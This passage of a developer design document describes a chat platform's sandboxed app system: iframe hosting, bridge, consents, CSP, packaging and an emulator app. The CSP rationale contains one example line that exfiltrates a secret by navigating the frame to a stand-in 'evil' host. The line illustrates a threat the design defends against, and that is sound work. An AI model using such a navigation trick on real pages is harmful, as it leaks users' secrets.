- **The presence line** (`client/src/lib/apps/presence.ts`) says which app a person is in, from the live store and the app's own manifest strings (D9: only channels the viewer can see, nothing sent or stored). `short` ("Na Locadora") sits under a name already on screen: the member list, the members panel and the voice roster row. `phrase` ("Raf tá na Locadora") is for where the line stands alone, the profile card. While somebody is in an app the line replaces their recado, and the recado is back when they leave. A server's list counts only that server's channels; the name goes through `formatAppPresence`, so `$&`, `{name}` and bidi characters in it stay inert. No line is drawn for an app the tab does not hold a config entry for.
- **The permission** `USE_APPS` is drawn in the role editor (`roles-settings-section.tsx`) and in a channel's permission overwrites (`channel-permissions-section.tsx`, `overwriteBitsForChannel(type, { appsOn })`) only while the `apps` flag is on for that server, and in the overwrites only for text and voice channels. The one first-run card, "Novo: apps no canal" (`apps-hint.tsx`), is once per person and only where the flag is on and an app is released.
- **The strip and the pane** (`components/apps/app-session-layout.tsx`, mounted around the call surface and the transcript in `App.tsx`) draw mock 03. The strip is for everybody who can see a session, seated or not (D13), and stays while the session exists; the app is drawn only for a seated person, in the conversation's place, with the call and the chat moved to a column beside it (320 px, 352 from `xl`; under it on a phone and in a window that leaves the body under 720 px). With no session the layout draws nothing of its own and the children keep their place in the tree, so the call stage never remounts. **The column (runtime flag `app_pane_layout_v2`, global, default on; off is the old 300 px column)** is three things in one order: the call, the chat's header, the transcript and composer. The call keeps its ONE set of controls with it (`CallDockProvider` publishes nothing inside the column, so the stage draws its bar in its own place: a card when nobody shows a picture, the band under the pictures when somebody does), on one row, with the hand, the music and picture-in-picture folded into "Mais" (`stageMoreItems`' `folded`); a share is a 16:9 tile at most half the column until somebody drags the divider (`appColumnStageTarget`, a bit less under 600 px); the page header stays up (`voiceStageOwnsHeader` stands down while the pane is on screen), so the chat header is "Chat" and nothing else. The strip carries **Chat**, the one control that puts the chat away and brings it back (also Cmd/Ctrl+Shift+., `toggleAppChat`): with no call the column goes (`hidden`, still mounted) and the app takes the body; with a call that is a card the column becomes a bar under the app, as wide as it; with pictures they stay a tile in their column and the rest says "Mostrar o chat". While the chat is away the toggle carries a dot for new messages and a count on the danger fill when one names the person. The choice is one per device (`pqp:apps:chat-hidden`), and a phone starts with the chat away. Hiding moves focus that was in the chat to the toggle; the shortcut that brings it back puts focus in the composer. The decisions live in `lib/apps/app-chat-visibility.ts` (`appColumnLayout`, `chatUnreadSince`), the context in `components/apps/app-column.tsx`. `lib/apps/strip-model.ts` decides the state (host, participant, spectator, handoff for the next host or for the others, reconnecting, lost after the 90 s, outside, ended) from data alone. Leaving the channel unmounts the frame and releases the seat; coming back finds the strip and Entrar.
- **The wire** (`lib/apps/session-wire.ts`) is the `AppSessionTransport` over `/ws`: `app-join` answered by the `app-session` snapshot, state patches answered by the next `app-state`, events fire and forget, and the seat resumed with a second `app-join` when the socket returns. `session-wire-instance.ts` holds the one wire of the tab; `App.tsx` points it at the realtime transport and feeds it every app frame. Nothing is queued while the socket is down.
- **The pane share** (`lib/apps/pane-share.ts`): the host's "Compartilhar tela" (only when the manifest says `share: "pane"`, the server allows it, and the channel is a voice channel the host is in) asks for the current tab and crops the capture to the pane with Region Capture (`CropTarget`, found on `BrowserCaptureMediaStreamTrack`); without it the tab is shared whole, and the desktop shell uses its own picker. The picture then goes out through the same share every other button starts. Never on a phone.
- **`/qa/apps`** (dev auth bypass only, like `/qa/ui`) renders the strip in every state at desktop and phone width. The countdown and a share cannot be reached from a local checkout without the sweep job and a capture picker, so this sheet is what the screenshots of those states come from.
- **The join sheet** (`components/apps/app-join-sheet.tsx`, decided by `lib/apps/join-model.ts`, mounted as `app-join-host.tsx`) is what Entrar does the first time a person joins an app. Every Entrar goes through `requestAppJoin`, and the host answers it: no consent on file for this app, or one gone stale, opens the sheet (nothing is sent); a consent on file joins straight in and says so in a toast with "Desfazer". The sheet reads the world as it is: the room filling turns it into Assistir, the session ending into "Esse app já terminou", the app being switched off into "Esse app não está disponível". Entering locks both buttons and the dialog cannot be dismissed; a failure is an alert and the same button becomes "Tentar de novo". The two lines "O app vê" and "O app não vê" are the platform's and are always there; the app adds only its manifest `notice`.
- **Consents** (`GET /api/me/app-consents`, `POST` and `DELETE /api/apps/:app/consent`, `server/src/apps/consents.ts`) are per person and per app, not per server, so they are not behind the per-server flag: they only ever hold what the person accepted. The row records the version on the sheet; revoking stamps `revoked_at` and the next Entrar shows the sheet again. A consent is **stale** when the current version's `capabilities` differ from the accepted version's, and the sheet shows again. Configurações, Apps (`components/settings/apps-section.tsx`) lists them and takes them back; the entry only appears for somebody who has accepted one.
- **The per-app id**: for an app whose manifest says `capabilities.identity: "user-id"`, and only for a participant who ticked "Deixar este app ver o meu id do pqp", the `app-session` frame carries `appUserId = base64url(HMAC-SHA256(key, appId + "\0" + userId))` with `key = HMAC-SHA256(CLERK_SECRET_KEY, "pqp-app-identity")` (`server/src/apps/identity.ts`). Computed on every snapshot, never stored; without the secret there is no id (and with `DEV_AUTH_BYPASS` a fixed dev secret). The page strips the pqp user id before anything reaches the app and passes `appUserId` through.

## The frame host (web client)

The pqp page runs an app in a sandboxed frame and is the only thing that talks to it. Code: `client/src/lib/apps/` (logic) and `client/src/components/apps/app-frame.tsx` (the React wrapper).

- **`AppFrame`** renders a wrapper `div` (`data-status` is `loading`, `ready`, `error` or `ended`) and `mountAppFrame` (`lib/apps/frame-controller.ts`) puts one `<iframe sandbox="allow-scripts" allow="" referrerpolicy="no-referrer">` in it. Props: `app` (an entry of `GET /api/apps/config`, as `AppRuntimeConfig`), `appsOrigin`, `transport`, `users`, `title`, `locale`, `asSpectator`, `onStatus`, `onShare`. `onStatus` gets `{ kind: "loading" | "ready" }`, `{ kind: "error", reason, code? }` (`bad-entry`, `join-failed` with the transport's code, `timeout`, `frame-navigated`, `flood`) or `{ kind: "ended", reason }`. The seat is taken on mount and released on unmount.
- **`AppSessionTransport`** (`lib/apps/types.ts`) is the whole interface to the server: `join`, `leave`, `patchState`, `sendEvent`, `end`, `subscribe` (handlers `onSession`, `onState`, `onEvent`, `onConnection`, `onEnded`). It maps one to one onto the `/ws` frames of `packages/shared/src/apps/frames.ts` and `POST /api/app-sessions/:id/end`. Participant changes reach the host as a fresh `app-session` snapshot (`onSession`): it is the only frame that carries seat ids next to user ids, so a roster change must be delivered to participants that way.
- **The bridge host** (`lib/apps/bridge-host.ts`) parses every message with `bridgeAppMessageSchema` (strict: a failure is answered `invalid`, or dropped when it has no usable id), enforces the manifest again (event rate and bytes, state bytes counted on the MERGED state, who may write, `share` only for a `pane` app where sharing is allowed, `files.pickLocal` only when files are allowed), maps `AppTransportError` codes to bridge errors, builds participants from scratch (a seat id, a cleaned display name, an avatar data URL of at most 65536 characters or null, never a user id; one list holds at most 4 MiB of avatars, so past that the largest are left out and the app draws its fallback) and passes every answer and push through the bridge schemas (a successful answer echoes the request `type`). A flood is answered `rate-limited` without parsing and ends the frame if it keeps going.
- **Files and assets.** `files.pickLocal` creates an `<input type=file>` in the PAGE (`accept` and the size cap from the manifest), reads the file and answers `{ bytes, ext }`; the file name is read once to find the extension and goes nowhere. `assets.get` fetches the manifest's asset with `cache: "force-cache"`, only from the apps origin (an asset URL anywhere else is refused without a request, and a redirect is an error), reading the body with the declared size as a hard limit, then checks the sha256 with `crypto.subtle` and transfers a copy; a mismatch answers `unavailable` and logs once, and concurrent requests for one asset share one fetch. Avatars are fetched only from `avatarOrigins` (the page's own origin and the API's; a user can set their avatar URL to anything), with a byte limit, a few at a time, and not at all once a roster's 4 MiB is spent.
- **Theme.** `hello` and `theme` carry up to 64 CSS custom properties: an allowlist of the design tokens of `docs/DESIGN.md` (surfaces, borders, text, accent, status and soft pairs, radii, fonts, `--color-focus-ring`) read as the browser resolved them, plus `--pqp-color-scheme` (`light` or `dark`). A change of brightness, skin, contrast or accent hue pushes `theme` again. `reducedMotion` is the OS setting.
- **Keyboard.** The frame is one tab stop and the page never traps focus or captures Escape; an app that traps focus fails review. `AppFrameHandle.focus()` puts focus on the frame from outside.

**Why the page carries a CSP at all.** CSP inside the frame cannot stop a frame from navigating ITSELF (`location.href = "https://evil/?" + secret`, `<meta http-equiv=refresh>`, an anchor click): it is a navigation, and `navigate-to` does not exist. The only control is the embedding page's `frame-src` (S0 spike). pqp.gg has no CSP and a site-wide header is a bigger decision, so when the first app frame mounts the page inserts `<meta http-equiv="Content-Security-Policy" content="frame-src 'self' blob: <apps origin> <every origin the client frames>">`: `lib/apps/frame-policy.ts`. It carries `frame-src` only, so it constrains nothing else, and it stays for the life of the page. The origins are YouTube (`www.youtube.com`, `www.youtube-nocookie.com`), Twitch (`player.twitch.tv`, `clips.twitch.tv`), TikTok, Instagram, and Cloudflare Turnstile. Not Google sign-in (One Tap) and not Clerk's host: their flows carry a `state` or redirect parameter to a destination somebody else registered, which would let a navigating app frame hand data to it; a deployment that frames more passes it as an extra origin. Never a wildcard on a multi-tenant domain. `frame-policy.test.ts` checks every embed URL the shared builders produce against the list and fails when a new source file renders an iframe. The host also removes the frame on a second `load` event (it left the document it was given) and after 20 seconds without a `hello`. Both are in `client/e2e/app-frame/`, which runs the real controller, host and SDK in a sandboxed frame under the production CSP against a canary server, in Chromium, WebKit and Firefox: without the policy all three engines deliver `?secret=1` to the canary, with it none does, for `location.href`, `location.replace`, `location.assign`, `<meta refresh>` and an anchor click.

Residual: the policy is page-wide, so a listed origin is also a place a hostile frame can send a query string to (with whatever the app was told). The listed embed hosts have no redirect to a destination the sender picks, so that data lands in a vendor's logs, not with the app's author. A structural fix (the app frame in a wrapper document whose `frame-src` is the apps origin alone) is a follow-up decision. WebKit opens a TCP connection for `<link rel=preconnect>` despite the CSP (S0 finding d).

Run the browser suite with `pnpm --filter @pqp/client e2e:app-frame` (CI runs Chromium and Firefox; add `--project=webkit` locally).

## Packaging

First-party apps live in the repository, one folder each under `apps/<name>/` (a pnpm workspace folder). `tools/apps-build/` builds them and writes everything the platform needs to serve and trust a bundle.

An app folder holds `manifest.source.json` (the manifest an author writes, validated with `appManifestSourceSchema`, so no hashes), a Vite app (`index.html`, `src/`) and its own `package.json` depending on `@pqp/app-sdk`. The entry page is `index.html`. Eco (`apps/eco/`, id `pqp-eco`) is the internal test app: a participant list with avatars, a counter in the session state, a ping event. It is `draft` until an operator turns it on; with `DEV_AUTH_BYPASS` the dev seed turns it on for the Sandbox hall only.

| Command | What it does |
|---|---|
| `pnpm apps:build` | Builds every app into `dist-apps/<id>/<version>/`, writes `dist-apps/_headers` and `server/src/apps/catalog.json`. |
| `pnpm apps:check` | Builds into a scratch folder and fails when the committed `catalog.json` differs (the lockfile pattern), or when a released version would change its bytes. Runs in CI. |
| `pnpm apps:dev` | Builds, serves `dist-apps` on `http://localhost:5175` with the same `_headers` rules (cache disabled) and rebuilds when `apps/` or `packages/app-sdk/src/` change. `APPS_DEV_PORT` moves it. |

What a build does, per app:

1. Vite build with a deterministic output: fixed file names (`index.js`, `index.css`, no content hash in a name, because the version folder is already immutable), no source maps, no module preload shim, nothing inlined. Same sources and same toolchain give the same bytes; a test builds twice and compares every hash. The Vite version is pinned exactly.
2. The entry page gets Subresource Integrity (`sha384`) and `crossorigin` on every script and stylesheet. The build fails on anything the frame's CSP would silently refuse: an inline `<script>` or `<style>`, a `style=` attribute, an `on*=` handler, `<base>`, `<meta http-equiv>`, a nested frame, or any reference that is not a relative path inside the bundle.
3. Every file is hashed. The built manifest is the source plus `entry.sha256`, and for each `assets[]` entry `sha256` and `bytes`, read from the built file (same for `store.screenshots[]`). It is validated with `validateAppManifest` before anything is written.
4. `dist-apps/_headers`, one rule per `/<id>/<version>/*`: the frame's Content-Security-Policy, `Cache-Control: public, max-age=31536000, immutable`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Cross-Origin-Resource-Policy: cross-origin` and `Access-Control-Allow-Origin: *`. CORS is on the whole bundle, not only on `assets[]`: the frame is an opaque origin, so it fetches its own module script and its SRI-protected stylesheet in CORS mode, and without the header Chromium refuses both ("origin 'null' has been blocked by CORS policy"). The files are the public, open-source bundle, so nothing is exposed.
5. The CSP is the one in PLAN D5 as amended by the S0 spike: `default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: blob:; font-src 'self'; media-src blob:; connect-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors <pqp origins>`. Only the manifest's `sandbox` knobs widen it: `wasm` adds `'wasm-unsafe-eval'` to `script-src`, `localBlobs` makes `connect-src` `blob:`, `blobWorkers` adds `worker-src blob:`. `'unsafe-eval'`, `script-src blob:` and `data:` in `connect-src` are never emitted.

`server/src/apps/catalog.json` is `{ "apps": [ { "manifest": <built manifest>, "manifestSha256": "<hex>" } ] }`, sorted by id then version. `manifestSha256` is the sha256 of the built manifest's canonical JSON (every object's keys sorted, no whitespace), so it does not depend on key order. The server loads it at boot, insert-only.

**Versions are immutable.** The build compares with the catalog on `origin/main`: an `(id, version)` that is already there must come out with the same `manifestSha256`, or the build fails with "bump the version". The manifest hash covers `entry.sha256`, which covers the SRI of the script and stylesheet, so any change to an app's code, or to `@pqp/app-sdk` (it is bundled into every app), is a changed version. A fork or a clone without `origin/main` skips this check with a warning; CI requires it. After a release, change an app by bumping `version` in its `manifest.source.json`.

**Deploy.** `.github/workflows/deploy-apps.yml` runs on a push to `main` that touches `apps/`, `packages/app-sdk/` or `tools/apps-build/`, builds and publishes `dist-apps` with `wrangler pages deploy` to the Pages project named by the repository variable `APPS_PAGES_PROJECT` (hosted: `pqp-apps`, served at `https://pqp-apps.pages.dev`). With the variable empty the job skips cleanly. The API finds the bundles through `APPS_ORIGIN` (dev `http://localhost:5175`, unset means apps cannot run). A Pages deploy replaces the whole site, so a version that is no longer built from `apps/` stops being served; a session pinned to it (at most 12 hours old) cannot load the frame for a late joiner. Keep a released version buildable until its last session is over, or accept that.

## Locadora, the retro emulator app

`apps/locadora/` (id `pqp-locadora`, category `emulator`, first-party only) is the emulator room of `docs/EMULATOR_ROOM.md` as an app: a person opens an NES, SNES or Game Boy file from their own disk and plays it in the frame. Read `docs/EMULATOR_ROOM.md` first: pqp provides, lists, links to and names no game, the file never leaves the person's machine, and `emulator_room` stays off until the lawyer review is answered in writing. Nothing in this app, its tests or its commits may include a game or its name; the e2e images are generated test patterns (see below).

**What it declares.** `capabilities.localFiles` with `.nes .gb .gbc .gba .sfc .smc .locadora` and a 64 MB cap (the host's picker enforces both and sends `{ bytes, ext }`, never the file name; `.locadora` is its own save file, imported through the picker and handed out through `files.saveLocal`), `capabilities.deviceStore` with 512 MB (`store.*`, above), `sandbox: { wasm: true, localBlobs: true }` and `blobWorkers: false`, `peer: none`, `share: pane` and `players { min 1, max 8, spectators: true }` (the platform refuses both share and spectator joins for an `emulator` app until `locadora_share` is on, D14), `content.userImages: true` (with the share a person's own screen is what others would see, so it stays off listed communities until Legal Gate L1b answers). Its seven `assets[]` are the three repacked cores (FCEUmm, mGBA and bsnes, the last built from source in `vendor/emulatorjs-core-bsnes`, see `docs/EMULATOR_ROOM.md`), their reports and `notices.txt` (the third-party notices, shown by the app's "Licenças" panel because a sandboxed frame cannot open a link; the same file is `license.notices`); the host fetches them from the apps origin, checks the hash and transfers the bytes on `assets.get`.

**Share and watch, built dark.** Everything below does nothing while `locadora_share` is off for the server and Legal Gate L1b is open (`docs/EMULATOR_ROOM.md`, item 7). The app does not read the flag: the host answers `share.request` with `not-allowed` unless the manifest says `share: "pane"` and the platform says the server may (`shareAllowed` on `GET /api/apps/config`), so the app sends one `share.request(false)` at start, a request to STOP sharing that changes nothing, as a probe. Only an answer draws the "Compartilhar" pill, and only while a game is on screen: it is one more chip in the HUD's top row (never over the bar), and while the share is on a "Compartilhando a tela" chip stays on screen when the HUD fades. The click starts and stops the pane share through pqp's own flow (the host's `ui.share`), so a watcher sees the existing share viewer. A start that does not happen (the person is not in the channel's call, the picker was closed) is an `unavailable` answer and the app says so on the HUD's toast; a stop request only ever ends the pane's own share, so the probe cannot end a screen the person is sharing for another reason. The host's strip does the same for its switch: when it cannot be used (no call, another screen already shared) it says why in words beside it. A phone is told sharing is not allowed, so the app draws nothing there. A person who joined as a spectator never sees the shelf: the app shows "Tu tá assistindo" and the names of the players whose game is on the screen, and the line that each game runs on its player's computer and pqp only passes the picture. Hiding the control is a courtesy: the platform refuses the real request and the spectator join itself. (A `shareAllowed` field in the `hello` push would replace the probe; it is a bridge contract change, so it is a suggestion for the bridge's owner, not part of this app.)

**The policy it runs under** is the S0 spike's Tier B, exactly (`script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; connect-src blob:`, no `worker-src`, no `'unsafe-eval'`, no `script-src blob:`). EmulatorJS 4.2.3 does not run under that as it ships, so the build changes it with four text patches (`apps/locadora/build/patch.mts`), each of which throws unless its needle is found exactly as many times as expected, so an EmulatorJS bump fails the build instead of a user's browser:

1. `unpack`: the core archive goes to `window.PQP_UNPACK`, which inflates with the browser's `DecompressionStream`, instead of a blob Web Worker that evals.
2. `corejs`: the core's JS glue loads from the bundle with its Subresource Integrity (`window.PQP_CORE_JS_URL`, `window.PQP_CORE_JS_SRI`) and is refused without one, instead of from a blob script.
3. `style`: every `setAttribute("style", x)` becomes a CSSOM write and the one SVG icon with an inline style gets presentation attributes.
4. `noupdate`: the update check (which fetches a CDN on `localhost`) is dropped.

Plus `src/shim.ts`: `localStorage` answers `null` (the opaque origin throws and EmulatorJS reads it first), `navigator.wakeLock` hands out a lock that holds nothing (the frame's `allow=""` refuses it and the browser reports the refusal as an error), and the emulator's own fullscreen button is off (the host fullscreens the iframe with `ui.fullscreen`).

**How it is built.** `apps/locadora/prepare.mts` is the first app with a pre-build step: the packager runs an app's `prepare.mts` before Vite and the app writes what it generates into its own git-ignored `public/` folder, which Vite copies as it is. Locadora's `prepare` unpacks each core's 7z archive with the decoder EmulatorJS itself ships (`extract7z.js`, run in a throwaway `vm`, so no system `7z` and no new dependency), repacks the files into the container of `src/container.ts` (raw deflate by `fflate`, pure JavaScript, so the bytes do not depend on the Node that builds them), writes the patched frontend, the glue of each core and the notices file. `index.html` loads `ejs/core-sri.js` and `ejs/emulator.min.js` as plain scripts, so the packager puts SRI on them; the chain is manifest hash, then `index.html`, then the patched frontend and the integrity table, then each core's glue.

**Tests.** `pnpm --filter @pqp-apps/locadora test`: the patches on the real frontend and each needle failing, the container round trip and its refusals, a real core unpacked and repacked, `prepare` twice giving the same bytes, strings and copy rules, the manifest, the empty allowlist (`src/allowlist.ts`, a copy of the old entry's), and a scan that no game-shaped file is in the folder. `pnpm --filter @pqp-apps/locadora e2e` (Chromium, WebKit and Firefox locally, Chromium in CI): the real build in an `allow-scripts` frame under its real CSP with a stand-in for the host page (`e2e/host/`), the GBA, NES and SNES **test patterns** (images written from scratch in `e2e/patterns.ts`, generated at test time into a temp folder and never committed) painting the screen with the audio running after the click, switching from one to the other in the same frame, no request outside the two local origins and nothing on a **canary server** on another port, the file's name never crossing into the frame or onto the network, and the spike's escape probes all failing inside the frame. What the e2e cannot check, and P3-C must: the host page's `frame-src` and the second-`load` rule against self navigation.

## Where things live

- The frame host: `client/src/lib/apps/` (`bridge-host.ts`, `frame-controller.ts`, `frame-policy.ts`, `types.ts` for the transport interface), `client/src/components/apps/app-frame.tsx`; browser suite `client/e2e/app-frame/`.
- The packager: `tools/apps-build/` (`bundle.mts` builds one app, `html.mts` SRI and the entry page rules, `headers.mts` CSP and `_headers`, `catalog.mts` the catalog and immutability, `dev-server.mts`, `cli.mts`). Apps: `apps/<name>/`. Output: `dist-apps/` (git-ignored); the committed result is `server/src/apps/catalog.json`.
- The public docs for app builders: `docs-apps/` (VitePress, `pnpm docs:apps`), written from this file and the code. The SDK's npm release is prepared but not done: `packages/app-sdk/PUBLISHING.md`.
- The SDK: `packages/app-sdk/` (`@pqp/app-sdk`). `connect()` in `connect.ts`, the request and push plumbing in `client.ts`, the public object in `app.ts`. Tests use a fake host on a real `MessageChannel` (`fake-host.fixture.ts`).
- Zod schemas, validator and constants: `packages/shared/src/apps/manifest.ts`
- Presence formatter: `packages/shared/src/apps/presence.ts`
- Bridge contract: `packages/shared/src/apps/bridge.ts`; WebSocket frames: `packages/shared/src/apps/frames.ts`; shared JSON, seat id and end reason pieces: `common.ts`; roster and JSON caps beyond the manifest's: `limits.ts`
- JSON Schema for third parties: `packages/shared/schemas/app-manifest-1.schema.json`
- Fixtures: `packages/shared/fixtures/app-manifests/` (`valid-*`, `invalid-schema-*` rejected by both schemas, `invalid-rule-*` accepted by the JSON Schema and rejected by the validator)
- Tests: `packages/shared/src/apps/*.test.ts`. The parity test runs both schemas over every fixture, so the JSON file and the zod schema cannot drift apart. Change one, change the other, add a fixture.
- Availability, catalog, config: `server/src/apps/{availability,catalog,config,origin}.ts`, route in `server/src/api/app-routes.ts`, client contract `packages/shared/src/apps/config.ts`
